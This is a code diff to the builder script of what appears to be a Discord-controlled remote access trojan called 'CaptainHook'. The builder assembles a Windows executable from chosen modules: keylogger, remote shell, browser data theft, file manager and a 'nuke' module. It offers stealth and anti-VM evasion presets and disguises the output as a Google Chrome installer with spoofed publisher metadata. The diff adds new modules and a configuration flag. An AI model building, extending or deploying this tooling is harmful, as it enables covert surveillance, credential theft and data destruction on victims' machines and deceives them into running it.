@@ -15,45 +15,51 @@ console = Console()
 PRESETS = {
     "🛡️  Full-Throttle": {
         "description": "All features included. Maximum power.",
-        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
+        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"],
         "stealth": True,
-        "anti_vm": True
+        "anti_vm": True,
+        "observability": True
     },
     "👻 Ghost": {
         "description": "Extreme Stealth. Stripped of loud features.",
-        "modules": ["screenshot", "shell", "info", "file_manager", "keylogger"],
+        "modules": ["screenshot", "shell", "info", "file_manager", "keylogger", "help", "encryption"],
         "stealth": True,
-        "anti_vm": True
+        "anti_vm": True,
+        "observability": False
     },
     "🧪 The Tester": {
         "description": "VM Friendly. Anti-VM and Persistence DISABLED.",
-        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
+        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"],
         "stealth": False,
         "anti_vm": False,
-        "developer": False
+        "developer": False,
+        "observability": True
     },
     "🛠️  Developer": {
         "description": "Full Control. Interactive TUI for live debugging. No Stealth.",
-        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
+        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"],
         "stealth": False,
         "anti_vm": False,
-        "developer": True
+        "developer": True,
+        "observability": True
     },
     "🤡 Troll-Mode": {
         "description": "High Visibility. Focus on fun and control.",
-        "modules": ["media", "control", "fun", "screenshot"],
+        "modules": ["media", "control", "fun", "screenshot", "help"],
         "stealth": False,
-        "anti_vm": False
+        "anti_vm": False,
+        "observability": True
     },
     "⚙️  Custom": {
         "description": "Manually select modules and security settings.",
         "modules": [],
         "stealth": True,
-        "anti_vm": True
+        "anti_vm": True,
+        "observability": True
     }
 }
 
-AVAILABLE_MODULES = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
+AVAILABLE_MODULES = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"]
 
 DISGUISES = {
     "Google Chrome": {"icon": "chrome.ico", "company": "Google LLC", "desc": "Google Chrome Installer", "version": "120.0.6099.130"},
@@ -249,6 +255,10 @@ def build(token, guild_id, preset_name, disguise_name):
         # Inject Developer Mode
         if preset.get("developer", False):
             content = content.replace("DEVELOPER_MODE = False", "DEVELOPER_MODE = True")
+        
+        # Inject Observability
+        if preset.get("observability", False):
+            content = content.replace("OBSERVABILITY = False", "OBSERVABILITY = True")
             
         with open(config_path, "w") as f:
             f.write(content)
@@ -259,8 +269,17 @@ def build(token, guild_id, preset_name, disguise_name):
         with open(main_path, "r") as f:
             main_content = f.read()
             
+        # Find the modules list line using a more robust search
+        import re
+        modules_pattern = r'modules = \["screenshot", .*? "encryption"\]'
         modules_str = str(preset["modules"])
-        main_content = main_content.replace('modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]', f'modules = {modules_str}')
+        
+        if re.search(modules_pattern, main_content):
+            main_content = re.sub(modules_pattern, f'modules = {modules_str}', main_content)
+        else:
+            # Fallback if the pattern changed slightly
+            console.print("[bold yellow]Warning:[/bold yellow] Module list pattern not found in main.py. Using fallback replacement.")
+            main_content = main_content.replace('modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"]', f'modules = {modules_str}')
         
         if not preset["anti_vm"]:
             main_content = main_content.replace('if AntiAnalysis.check_all():', 'if False:')
@@ -313,11 +332,10 @@ def build(token, guild_id, preset_name, disguise_name):
     # Generate docker-compose.override.yml for Docker builds
     try:
         docker_cmd = f"wine python.exe -m PyInstaller --onefile {noconsole} --name CaptainHook --paths=/src/build_staging build_staging/src/client/main.py"
-        override_content = f"""version: '3.8'
+        override_content = f"""version: '2.4'
 services:
   windows-builder:
-    command: |
-      bash -c "{docker_cmd}"
+    command: bash -c "{docker_cmd}"
 """
         with open("docker-compose.override.yml", "w") as f:
             f.write(override_content)
